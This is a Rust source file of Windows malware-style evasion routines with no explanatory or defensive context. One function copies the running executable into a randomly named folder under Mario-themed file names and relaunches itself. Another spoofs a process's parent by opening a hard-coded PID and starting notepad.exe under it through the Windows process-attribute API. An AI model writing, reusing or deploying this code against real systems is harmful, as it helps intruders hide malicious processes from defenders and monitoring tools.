use rand::Rng;
use std::ffi::OsStr;
use rand::distributions::{Alphanumeric, DistString};


use std::mem;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::shared::basetsd::SIZE_T;
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc};
use winapi::um::processthreadsapi::{
    CreateProcessA, InitializeProcThreadAttributeList, OpenProcess, UpdateProcThreadAttribute,PROCESS_INFORMATION,
};
use winapi::um::winbase::STARTUPINFOEXA;
use winapi::um::winnt::{HANDLE, LPSTR};


pub fn auto_spawn(exe_path: &str){
    let exe_in = std::env::current_exe().unwrap();
    // set new
    let exe_out = std::path::PathBuf::from(exe_path);
    // create all the missing folder
    let create_path_result = std::fs::create_dir_all(exe_out.clone().parent().unwrap());

    match create_path_result{
        Err(_) => {},
        Ok(_) => {
            let create_path_result = std::fs::copy(exe_in, exe_out.clone());
            match create_path_result{
                Err(_) => {},
                Ok(_) => {
                    let _child = std::process::Command::new(exe_path)
                        .spawn()
                        .expect("failed to execute process");
                    std::process::exit(0);
                }
            }
        }
    }
}

pub fn jump_man(){
    let start_exe = std::env::current_exe().unwrap();
    let binding = start_exe.clone();
    let folder_exe = binding.parent().unwrap();
    let name_exe = start_exe.file_name().unwrap();
    let name_exe_string = name_exe.to_str().unwrap().to_string();

    if name_exe_string == "All_Star.exe"{
        return();
    }

    let mut rng = rand::thread_rng();
    let mario_world = vec![
        "Little_Goombas.exe",
        "Koopa_Troopas.exe",
        "Buzzy_Beetles.exe",
        "Koopa_Paratroopas.exe",
        "Bullet_Bills.exe",
        "Hammer_Brothers.exe",
        "Cheep_cheeps.exe",
        "All_Star.exe"
        ];

    let random_string_index: usize = rng.gen_range(0..mario_world.len());
    let enemies  = mario_world[random_string_index];
    let new_folder = Alphanumeric.sample_string(&mut rand::thread_rng(), 8);
    let binding = folder_exe.join(new_folder).join(enemies);
    let out_exe = binding.to_str().unwrap();
    auto_spawn(out_exe);
}

pub fn ppid_spoof() {
    
    let mut attrsize: SIZE_T = Default::default();
    let mut pi = PROCESS_INFORMATION::default();
    let mut si = STARTUPINFOEXA::default();
    unsafe {
        let mut openproc: HANDLE = OpenProcess(0x02000000, 0, 19400); //PPID

        InitializeProcThreadAttributeList(null_mut(), 1, 0, &mut attrsize);
        si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, attrsize) as _;
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &mut attrsize);
        UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            0 | 0x00020000,
            (&mut openproc) as *mut *mut c_void as *mut c_void,
            mem::size_of::<HANDLE>(),
            null_mut(),
            null_mut(),
        );
        si.StartupInfo.cb = mem::size_of::<STARTUPINFOEXA>() as u32;
        CreateProcessA(
            null_mut(),
            "notepad.exe\0".as_ptr() as LPSTR,
            null_mut(),
            null_mut(),
            0,
            0x00080000,
            null_mut(),
            null_mut(),
            &mut si.StartupInfo,
            &mut pi,
        );
    }
}